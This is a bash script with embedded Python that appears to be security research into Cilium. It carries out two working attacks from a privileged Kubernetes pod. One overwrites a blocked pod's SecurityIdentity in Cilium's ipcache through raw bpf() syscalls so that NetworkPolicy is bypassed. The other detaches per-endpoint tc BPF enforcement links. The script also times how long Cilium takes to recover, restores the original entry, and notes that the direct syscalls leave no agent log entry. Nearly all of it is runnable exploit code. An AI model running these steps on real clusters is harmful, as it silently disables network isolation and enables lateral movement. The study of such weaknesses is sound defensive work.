#!/bin/bash
# Cilium BPF State Tampering — Attack Script
#
# Runs INSIDE the privileged attack-pod. Tests two attack vectors:
#   1. ipcache SecurityIdentity poisoning  (direct bpf() syscall via ctypes)
#   2. Per-endpoint TC BPF link detachment (removes per-pod tc enforcement)
#
# Usage (on the HOST):
#   CPOD=$(kubectl get pods -n kube-system -l k8s-app=cilium \
#          -o jsonpath='{.items[0].metadata.name}')
#   kubectl cp kube-system/${CPOD}:/usr/local/bin/bpftool /tmp/bpftool-cilium
#   kubectl cp /tmp/bpftool-cilium cilium-research/attack-pod:/usr/local/bin/bpftool
#   kubectl exec -n cilium-research attack-pod -- mkdir -p /attack
#   kubectl cp cilium_attack.sh cilium-research/attack-pod:/attack/cilium_attack.sh
#   kubectl exec -it -n cilium-research attack-pod -- \
#       bash /attack/cilium_attack.sh <target_ip> <blocked_ip> <allowed_ip>

set -uo pipefail

RED='\033[1;31m'; GREEN='\033[1;32m'; CYAN='\033[1;36m'
YELLOW='\033[1;33m'; BOLD='\033[1m'; DIM='\033[2m'; NC='\033[0m'

atk()     { echo -e "${RED}[ATTACK ]${NC} $*"; }
inf()     { echo -e "${YELLOW}[INFO   ]${NC} $*"; }
ok()      { echo -e "         ${BOLD}[+]${NC} $*"; }
fail()    { echo -e "${RED}[-]${NC} $*"; }
sep()     { echo -e "${DIM}──────────────────────────────────────────────────────${NC}"; }
section() { echo -e "\n${BOLD}$*${NC}"; sep; }

TARGET_IP="${1:?Usage: $0 <target_ip> <blocked_ip> <allowed_ip>}"
BLOCKED_IP="${2:?}"
ALLOWED_IP="${3:?}"

# ── Phase 0: prerequisites ────────────────────────────────────────────────────
section "Phase 0: Install prerequisites"
export DEBIAN_FRONTEND=noninteractive
apt-get update -qq 2>/dev/null
apt-get install -y -qq python3 curl iproute2 \
    2>&1 | grep -E "^(Unpacking|Setting up|E:)" || true

[ -f /usr/local/bin/bpftool ] && chmod +x /usr/local/bin/bpftool

BPFTOOL=$(  { [ -x /usr/local/bin/bpftool ] && echo /usr/local/bin/bpftool; } \
         || ls /usr/lib/linux-tools/*/bpftool 2>/dev/null | sort -V | tail -1 \
         || command -v bpftool 2>/dev/null \
         || true)
if [ -n "$BPFTOOL" ]; then
    $BPFTOOL version >/dev/null 2>&1 || BPFTOOL=""
fi
[ -z "$BPFTOOL" ] && { fail "No working bpftool"; exit 1; }
ok "bpftool: $BPFTOOL"
ok "python3: $(python3 --version 2>&1)"
ok "arch:    $(uname -m)"

echo "$BPFTOOL" > /tmp/_bpftool_path

# ── Phase 1: Discovery ────────────────────────────────────────────────────────
section "Phase 1: Discover Cilium BPF state"

inf "bpffs layout (top levels):"
find /sys/fs/bpf -maxdepth 4 2>/dev/null | head -60
echo ""

# Locate ipcache map by pin path, then by kernel name
IPCACHE_PATH=""
for p in /sys/fs/bpf/tc/globals/cilium_ipcache_v2 \
          /sys/fs/bpf/tc/globals/cilium_ipcache \
          /sys/fs/bpf/cilium/maps/cilium_ipcache_v2 \
          /sys/fs/bpf/cilium/maps/cilium_ipcache; do
    [ -e "$p" ] && { IPCACHE_PATH="$p"; break; }
done
[ -z "$IPCACHE_PATH" ] && \
    IPCACHE_PATH=$(find /sys/fs/bpf -name "cilium_ipcache*" 2>/dev/null | head -1 || true)

IPCACHE_ID=""
IPCACHE_KEY_SIZE=""
IPCACHE_VAL_SIZE=""
if [ -n "$IPCACHE_PATH" ]; then
    META=$($BPFTOOL map show pinned "$IPCACHE_PATH" -j 2>/dev/null || echo "{}")
    IPCACHE_ID=$(echo "$META" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('id',''))" 2>/dev/null || true)
    IPCACHE_KEY_SIZE=$(echo "$META" | python3 -c "import sys,json; print(json.load(sys.stdin).get('bytes_key',0))" 2>/dev/null || echo 0)
    IPCACHE_VAL_SIZE=$(echo "$META" | python3 -c "import sys,json; print(json.load(sys.stdin).get('bytes_value',0))" 2>/dev/null || echo 0)
    ok "ipcache: $IPCACHE_PATH  id=$IPCACHE_ID  key=${IPCACHE_KEY_SIZE}B  val=${IPCACHE_VAL_SIZE}B"
fi

if [ -z "$IPCACHE_ID" ]; then
    IPCACHE_ID=$($BPFTOOL map show -j 2>/dev/null | python3 -c "
import sys,json
for m in json.load(sys.stdin):
    if 'cilium_ipcache' in m.get('name',''):
        print(m['id'], m.get('bytes_key',0), m.get('bytes_value',0)); break" 2>/dev/null || true)
    if [ -n "$IPCACHE_ID" ]; then
        set -- $IPCACHE_ID
        IPCACHE_ID=$1; IPCACHE_KEY_SIZE=${2:-0}; IPCACHE_VAL_SIZE=${3:-0}
        ok "ipcache (by name): id=$IPCACHE_ID  key=${IPCACHE_KEY_SIZE}B  val=${IPCACHE_VAL_SIZE}B"
    else
        fail "ipcache map not found"
    fi
fi

echo "$IPCACHE_ID|$IPCACHE_KEY_SIZE|$IPCACHE_VAL_SIZE|$IPCACHE_PATH" > /tmp/_ipcache_meta
sep

# ── Phase 2: Baseline ─────────────────────────────────────────────────────────
section "Phase 2: Baseline — confirm NetworkPolicy is enforced"
echo -n "  attack-pod → policy-target ($TARGET_IP): "
if curl -s --max-time 3 "http://$TARGET_IP" -o /dev/null 2>/dev/null; then
    echo -e "${RED}ALLOWED${NC}"
else
    echo -e "${GREEN}BLOCKED${NC} ✓"
fi
inf "Verify from blocked-source (HOST):"
echo -e "  ${BOLD}kubectl exec -n cilium-research blocked-source -- curl -s --max-time 3 http://$TARGET_IP${NC}"
sep

# ── Phase 3: ipcache poisoning via direct bpf() syscall ──────────────────────
section "Phase 3: ipcache SecurityIdentity poisoning"
atk "Reading ipcache via bpftool (JSON), writing via direct bpf() syscall"
echo ""

if [ -z "$IPCACHE_ID" ]; then
    inf "Skipping — ipcache not found"
else

export BPFTOOL IPCACHE_ID IPCACHE_KEY_SIZE IPCACHE_VAL_SIZE IPCACHE_PATH
export BLOCKED_IP ALLOWED_IP TARGET_IP

python3 << 'PYEOF'
"""
Phase 3: Find ipcache entries for blocked/allowed pods, then call bpf()
syscall directly (BPF_OBJ_GET → BPF_MAP_UPDATE_ELEM) to overwrite the
blocked pod's SecurityIdentity. bpftool's argument parser refuses
multi-byte hex with --no-color so we go straight to the kernel.
"""
import ctypes, struct, os, sys, platform, json, subprocess, socket

BPFTOOL    = open('/tmp/_bpftool_path').read().strip()
IPCACHE_ID = int(os.environ['IPCACHE_ID'])
KEY_SIZE   = int(os.environ.get('IPCACHE_KEY_SIZE') or 0)
VAL_SIZE   = int(os.environ.get('IPCACHE_VAL_SIZE') or 0)
IPCACHE_PATH = os.environ.get('IPCACHE_PATH', '')
BLOCKED    = os.environ['BLOCKED_IP']
ALLOWED    = os.environ['ALLOWED_IP']

YELLOW='\033[1;33m'; RED='\033[1;31m'; GREEN='\033[1;32m'
BOLD='\033[1m'; NC='\033[0m'

# ── BPF syscall plumbing ─────────────────────────────────────────────────────
SYS_bpf = {'aarch64': 280, 'x86_64': 321, 'armv7l': 386}.get(platform.machine())
if not SYS_bpf:
    print(f"{RED}[-]{NC} Unknown arch {platform.machine()}"); sys.exit(0)

libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.syscall.restype  = ctypes.c_long
libc.syscall.argtypes = [ctypes.c_long, ctypes.c_long, ctypes.c_void_p, ctypes.c_uint]

BPF_MAP_LOOKUP_ELEM = 1
BPF_MAP_UPDATE_ELEM = 2
BPF_OBJ_GET         = 7

class BpfMapElem(ctypes.Structure):
    _pack_ = 1
    _fields_ = [
        ('map_fd', ctypes.c_uint32),
        ('_pad',   ctypes.c_uint32),
        ('key',    ctypes.c_uint64),
        ('value',  ctypes.c_uint64),
        ('flags',  ctypes.c_uint64),
    ]

class BpfObjGet(ctypes.Structure):
    _pack_ = 1
    _fields_ = [
        ('pathname',   ctypes.c_uint64),
        ('bpf_fd',     ctypes.c_uint32),
        ('file_flags', ctypes.c_uint32),
    ]

def bpf_obj_get(path):
    pbuf = ctypes.create_string_buffer(path.encode() + b'\x00')
    attr = BpfObjGet(pathname=ctypes.addressof(pbuf), bpf_fd=0, file_flags=0)
    fd = libc.syscall(SYS_bpf, BPF_OBJ_GET, ctypes.byref(attr), ctypes.sizeof(attr))
    if fd < 0:
        raise OSError(ctypes.get_errno(), os.strerror(ctypes.get_errno()))
    return fd

def map_update(fd, key_b, val_b):
    k = ctypes.create_string_buffer(key_b, len(key_b))
    v = ctypes.create_string_buffer(val_b, len(val_b))
    attr = BpfMapElem(map_fd=fd, key=ctypes.addressof(k),
                      value=ctypes.addressof(v), flags=0)
    rc = libc.syscall(SYS_bpf, BPF_MAP_UPDATE_ELEM,
                      ctypes.byref(attr), ctypes.sizeof(attr))
    if rc != 0:
        raise OSError(ctypes.get_errno(), os.strerror(ctypes.get_errno()))

def map_lookup(fd, key_b, val_size):
    k = ctypes.create_string_buffer(key_b, len(key_b))
    v = ctypes.create_string_buffer(val_size)
    attr = BpfMapElem(map_fd=fd, key=ctypes.addressof(k),
                      value=ctypes.addressof(v), flags=0)
    rc = libc.syscall(SYS_bpf, BPF_MAP_LOOKUP_ELEM,
                      ctypes.byref(attr), ctypes.sizeof(attr))
    return bytes(v.raw[:val_size]) if rc == 0 else None

# ── dump ipcache as JSON via bpftool (reads work fine) ───────────────────────
def hexarr_to_bytes(arr):
    """JSON byte array → bytes. Handles ['0x40', ...] and [64, ...]."""
    out = bytearray()
    for x in arr:
        if isinstance(x, str):
            out.append(int(x, 16) if x.startswith('0x') else int(x))
        else:
            out.append(int(x))
    return bytes(out)

print(f"{YELLOW}[INFO   ]{NC} Dumping ipcache id={IPCACHE_ID} as JSON...")
r = subprocess.run(f"{BPFTOOL} map dump id {IPCACHE_ID} -j",
                   shell=True, capture_output=True, text=True)
if r.returncode != 0:
    print(f"{RED}[-]{NC} dump failed: {r.stderr.strip()}"); sys.exit(0)

try:
    raw_entries = json.loads(r.stdout)
except json.JSONDecodeError as e:
    print(f"{RED}[-]{NC} JSON parse error: {e}"); sys.exit(0)

entries = []
for e in raw_entries:
    if 'key' not in e or 'value' not in e:
        continue
    entries.append((hexarr_to_bytes(e['key']), hexarr_to_bytes(e['value'])))

if not entries:
    print(f"{RED}[-]{NC} No entries parsed from JSON dump"); sys.exit(0)

actual_key = len(entries[0][0])
actual_val = len(entries[0][1])
print(f"{YELLOW}[INFO   ]{NC} {len(entries)} entries, key={actual_key}B value={actual_val}B")
if KEY_SIZE and actual_key != KEY_SIZE:
    print(f"{YELLOW}[!      ]{NC} key size mismatch (meta said {KEY_SIZE}, dump said {actual_key})")

blocked_b = socket.inet_aton(BLOCKED)
allowed_b  = socket.inet_aton(ALLOWED)

blocked_entry = next((e for e in entries if blocked_b in e[0]), None)
allowed_entry = next((e for e in entries if allowed_b  in e[0]), None)

print(f"{RED}[ATTACK ]{NC} {BLOCKED}: found={blocked_entry is not None}")
print(f"{GREEN}[+      ]{NC} {ALLOWED}: found={allowed_entry  is not None}")

if not blocked_entry or not allowed_entry:
    print(f"\n{YELLOW}[INFO   ]{NC} Could not locate IPs. First entries:")
    for kb, vb in entries[:6]:
        print(f"  key={kb.hex()}  val={vb.hex()}")
    sys.exit(0)

blocked_id = struct.unpack('<I', blocked_entry[1][:4])[0]
allowed_id = struct.unpack('<I', allowed_entry[1][:4])[0]
print(f"\n{BOLD}SecurityIdentity:{NC}")
print(f"  {RED}{BLOCKED}{NC} → {RED}{blocked_id}{NC}")
print(f"  {GREEN}{ALLOWED}{NC} → {GREEN}{allowed_id}{NC}")

if blocked_id == allowed_id:
    print(f"{YELLOW}[INFO   ]{NC} Identities already equal — nothing to poison.")
    sys.exit(0)

# Build poisoned value: rewrite first 4 bytes (sec_label LE u32)
new_val = bytearray(blocked_entry[1])
struct.pack_into('<I', new_val, 0, allowed_id)
new_val = bytes(new_val)

# Save originals for restore
open('/tmp/cilium_restore_key', 'wb').write(blocked_entry[0])
open('/tmp/cilium_restore_val', 'wb').write(blocked_entry[1])

print(f"\n{RED}[ATTACK ]{NC} Calling bpf(BPF_MAP_UPDATE_ELEM) directly...")
print(f"  key:      {blocked_entry[0].hex()}")
print(f"  original: {blocked_entry[1].hex()}  (id={blocked_id})")
print(f"  poisoned: {new_val.hex()}  (id={allowed_id})")

try:
    # Open the map by pinned path (more reliable than id-based lookup)
    if IPCACHE_PATH:
        map_fd = bpf_obj_get(IPCACHE_PATH)
    else:
        # No pin path → fall back to bpftool's map pin into a temp location
        tmp_pin = '/sys/fs/bpf/_atk_ipcache_pin'
        subprocess.run(f"{BPFTOOL} map pin id {IPCACHE_ID} {tmp_pin}",
                       shell=True, check=False)
        map_fd = bpf_obj_get(tmp_pin)
        os.unlink(tmp_pin)
    map_update(map_fd, blocked_entry[0], new_val)
    os.close(map_fd)

    print(f"\n{RED}{BOLD}★  IPCACHE POISONED via bpf() syscall  ★{NC}")
    print(f"   {BLOCKED} now claims identity {allowed_id}")
    open('/tmp/cilium_poison_active', 'w').write(f"{IPCACHE_ID}")
    print(f"\n{YELLOW}[INFO   ]{NC} Test bypass NOW (HOST):")
    print(f"   kubectl exec -n cilium-research blocked-source -- \\")
    print(f"       curl -s --max-time 5 http://{os.environ['TARGET_IP']}")
    print(f"   Expected: nginx HTML  (NetworkPolicy bypassed)")
except OSError as e:
    print(f"\n{RED}[-]{NC} bpf() syscall failed: errno={e.errno} {e.strerror}")
    if e.errno == 1:   # EPERM
        print(f"    EPERM → CAP_BPF or CAP_SYS_ADMIN missing in container")
    elif e.errno == 22:  # EINVAL
        print(f"    EINVAL → key/value size mismatch (map expects different layout)")
PYEOF

fi   # end ipcache block

sep

# ── Phase 4: Monitor ipcache recovery ─────────────────────────────────────────
if [ -f /tmp/cilium_poison_active ]; then
    section "Phase 4: Monitor cilium-agent reconciliation"
    POISON_START=$(date +%s%3N)
    RECOVERED=0
    inf "Polling every 2 s for up to 120 s..."
    echo ""

    for i in $(seq 1 60); do
        sleep 2
        CURRENT=$(python3 << 'PYINNER'
import os, ctypes, struct, platform, json, subprocess, sys
SYS_bpf = {'aarch64':280,'x86_64':321,'armv7l':386}.get(platform.machine(),321)
libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.syscall.restype  = ctypes.c_long
libc.syscall.argtypes = [ctypes.c_long, ctypes.c_long, ctypes.c_void_p, ctypes.c_uint]

class E(ctypes.Structure):
    _pack_=1
    _fields_=[('map_fd',ctypes.c_uint32),('_p',ctypes.c_uint32),
              ('key',ctypes.c_uint64),('value',ctypes.c_uint64),
              ('flags',ctypes.c_uint64)]
class G(ctypes.Structure):
    _pack_=1
    _fields_=[('pathname',ctypes.c_uint64),('bpf_fd',ctypes.c_uint32),
              ('file_flags',ctypes.c_uint32)]

path = open('/tmp/_ipcache_meta').read().strip().split('|')[3]
if not path: sys.exit(0)
pbuf = ctypes.create_string_buffer(path.encode()+b'\x00')
g = G(pathname=ctypes.addressof(pbuf), bpf_fd=0, file_flags=0)
fd = libc.syscall(SYS_bpf, 7, ctypes.byref(g), ctypes.sizeof(g))
if fd < 0: sys.exit(0)

k = open('/tmp/cilium_restore_key','rb').read()
val_size = len(open('/tmp/cilium_restore_val','rb').read())
kb = ctypes.create_string_buffer(k, len(k))
vb = ctypes.create_string_buffer(val_size)
attr = E(map_fd=fd, key=ctypes.addressof(kb), value=ctypes.addressof(vb), flags=0)
rc = libc.syscall(SYS_bpf, 1, ctypes.byref(attr), ctypes.sizeof(attr))
if rc == 0:
    print(bytes(vb.raw[:4]).hex())
PYINNER
)
        ORIG_ID_HEX=$(python3 -c "
v = open('/tmp/cilium_restore_val','rb').read()[:4]
print(v.hex())
")
        NOW=$(date +%s%3N); ELAPSED=$(( NOW - POISON_START ))
        if [ "$CURRENT" = "$ORIG_ID_HEX" ]; then
            echo -e "  ${GREEN}[+]${NC} $(date '+%H:%M:%S')  identity RESTORED  (${ELAPSED} ms)"
            echo "$ELAPSED" > /tmp/cilium_ipcache_recovery_ms
            RECOVERED=1
            break
        else
            echo -e "  ${RED}[!]${NC} $(date '+%H:%M:%S')  current=${CURRENT:-?}  orig=$ORIG_ID_HEX  (${ELAPSED} ms)"
        fi
    done

    [ "$RECOVERED" -eq 0 ] && {
        NOW=$(date +%s%3N); ELAPSED=$(( NOW - POISON_START ))
        echo -e "\n  ${RED}[!!]${NC} NOT corrected in ${ELAPSED} ms — this is the open window"
        echo "-1" > /tmp/cilium_ipcache_recovery_ms
    }

    section "Phase 4b: Restore ipcache"
    python3 << 'RESTOREEOF'
import os, ctypes, platform
SYS_bpf = {'aarch64':280,'x86_64':321,'armv7l':386}.get(platform.machine(),321)
libc = ctypes.CDLL("libc.so.6", use_errno=True)
libc.syscall.restype = ctypes.c_long
libc.syscall.argtypes = [ctypes.c_long, ctypes.c_long, ctypes.c_void_p, ctypes.c_uint]

class E(ctypes.Structure):
    _pack_=1
    _fields_=[('map_fd',ctypes.c_uint32),('_p',ctypes.c_uint32),
              ('key',ctypes.c_uint64),('value',ctypes.c_uint64),
              ('flags',ctypes.c_uint64)]
class G(ctypes.Structure):
    _pack_=1
    _fields_=[('pathname',ctypes.c_uint64),('bpf_fd',ctypes.c_uint32),
              ('file_flags',ctypes.c_uint32)]

meta = open('/tmp/_ipcache_meta').read().strip().split('|')
path = meta[3]
pbuf = ctypes.create_string_buffer(path.encode()+b'\x00')
g = G(pathname=ctypes.addressof(pbuf), bpf_fd=0, file_flags=0)
fd = libc.syscall(SYS_bpf, 7, ctypes.byref(g), ctypes.sizeof(g))
k = open('/tmp/cilium_restore_key','rb').read()
v = open('/tmp/cilium_restore_val','rb').read()
kb = ctypes.create_string_buffer(k, len(k))
vb = ctypes.create_string_buffer(v, len(v))
attr = E(map_fd=fd, key=ctypes.addressof(kb), value=ctypes.addressof(vb), flags=0)
rc = libc.syscall(SYS_bpf, 2, ctypes.byref(attr), ctypes.sizeof(attr))
print('\033[1;32m[+]\033[0m ipcache restored' if rc == 0
      else f'\033[1;31m[-]\033[0m restore failed errno={ctypes.get_errno()}')
RESTOREEOF
    rm -f /tmp/cilium_poison_active /tmp/cilium_restore_key /tmp/cilium_restore_val
fi
sep

# ── Phase 5: Per-endpoint TC BPF link detachment ──────────────────────────────
section "Phase 5: Per-endpoint TC BPF link detachment"
atk "Detaching Cilium tc programs from per-endpoint veth pairs"
echo ""

LINKS_BASE="/sys/fs/bpf/cilium/endpoints"
rm -f /tmp/cilium_detached_links

if [ ! -d "$LINKS_BASE" ]; then
    inf "No $LINKS_BASE — falling back to tc filter enumeration"
    for iface in $(ip link 2>/dev/null | grep -oP '^\d+: \Klxc[^:@]+' | head -20); do
        inf "Cilium veth: $iface"
        tc filter show dev "$iface" ingress 2>/dev/null | head -3 || true
        tc filter show dev "$iface" egress  2>/dev/null | head -3 || true
    done
else
    LINK_PINS=$(find "$LINKS_BASE" -not -type d 2>/dev/null || true)
    if [ -z "$LINK_PINS" ]; then
        inf "No bpf_link pins under $LINKS_BASE"
        ls "$LINKS_BASE" 2>/dev/null || true
    else
        echo "$LINK_PINS" | while read -r pin; do
            EPID=$(echo "$pin" | grep -oP 'endpoints/\K[0-9]+')
            LN=$(basename "$pin")
            META=$($BPFTOOL link show pinned "$pin" -j 2>/dev/null || echo "{}")
            LID=$(echo "$META" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('id',''))" 2>/dev/null || true)
            LTYPE=$(echo "$META" | python3 -c "
import sys,json
try:
    d=json.load(sys.stdin)
    print(d.get('type','?'), d.get('prog',{}).get('name','') if isinstance(d.get('prog'),dict) else '')
except: pass" 2>/dev/null || true)
            [ -z "$LID" ] && { inf "skip $pin (no id)"; continue; }
            atk "endpoint=$EPID  link=$LN  id=$LID  $LTYPE"
            if $BPFTOOL link detach id "$LID" 2>/dev/null; then
                echo -e "  ${RED}[+] DETACHED${NC}"
                echo "$LID:$EPID:$LN" >> /tmp/cilium_detached_links
            else
                echo -e "  ${YELLOW}[-] detach failed${NC}"
            fi
        done
    fi
fi

echo ""
if [ -f /tmp/cilium_detached_links ]; then
    N=$(wc -l < /tmp/cilium_detached_links)
    atk "$N link(s) detached"
    echo ""
    inf "Test bypass NOW (HOST):"
    echo -e "  ${BOLD}kubectl exec -n cilium-research blocked-source -- curl -s --max-time 5 http://$TARGET_IP${NC}"
    echo ""
    inf "Watch cilium-agent (HOST):"
    echo -e "  ${DIM}kubectl logs -n kube-system -l k8s-app=cilium --since=30s | grep -iE 'attach|link|endpoint'${NC}"

    section "Phase 5b: Monitor re-attachment"
    DETACH_START=$(date +%s%3N)
    RECOVERED=0
    for i in $(seq 1 30); do
        sleep 2
        CUR=$(find "$LINKS_BASE" -not -type d 2>/dev/null | wc -l)
        NOW=$(date +%s%3N); ELAPSED=$(( NOW - DETACH_START ))
        if [ "$CUR" -ge "$N" ]; then
            echo -e "  ${GREEN}[+]${NC} $(date '+%H:%M:%S')  $CUR links present (${ELAPSED} ms)"
            echo "$ELAPSED" > /tmp/cilium_link_recovery_ms
            RECOVERED=1
            break
        else
            echo -e "  ${RED}[!]${NC} $(date '+%H:%M:%S')  $CUR/$N links (${ELAPSED} ms)"
        fi
    done
    [ "$RECOVERED" -eq 0 ] && {
        NOW=$(date +%s%3N); ELAPSED=$(( NOW - DETACH_START ))
        echo -e "\n  ${RED}[!!]${NC} NOT re-attached in ${ELAPSED} ms"
        echo "-1" > /tmp/cilium_link_recovery_ms
    }
fi
sep

# ── Phase 6: Summary ──────────────────────────────────────────────────────────
section "Phase 6: Research Summary"
echo ""
echo -e "${BOLD}Vector 1: ipcache SecurityIdentity poisoning${NC}"
if [ -f /tmp/cilium_ipcache_recovery_ms ]; then
    REC=$(cat /tmp/cilium_ipcache_recovery_ms)
    [ "$REC" = "-1" ] \
        && echo -e "  ${RED}WRITE: success  |  recovery: NOT OBSERVED (120 s)${NC}" \
        || echo -e "  ${RED}WRITE: success  |  recovery: ${REC} ms${NC}"
fi
echo ""
echo -e "${BOLD}Vector 2: Per-endpoint TC bpf_link detach${NC}"
if [ -f /tmp/cilium_link_recovery_ms ]; then
    REC=$(cat /tmp/cilium_link_recovery_ms)
    [ "$REC" = "-1" ] \
        && echo -e "  ${RED}DETACH: success  |  recovery: NOT OBSERVED (60 s)${NC}" \
        || echo -e "  ${RED}DETACH: success  |  recovery: ${REC} ms${NC}"
fi
echo ""
echo -e "${BOLD}Preconditions:${NC} privileged pod + hostPath bpffs + CAP_BPF/SYS_ADMIN"
echo -e "${BOLD}Detection gap:${NC} no cilium-agent log entry for direct bpf() syscalls"
echo -e "${DIM}Cleanup: kubectl delete namespace cilium-research${NC}"
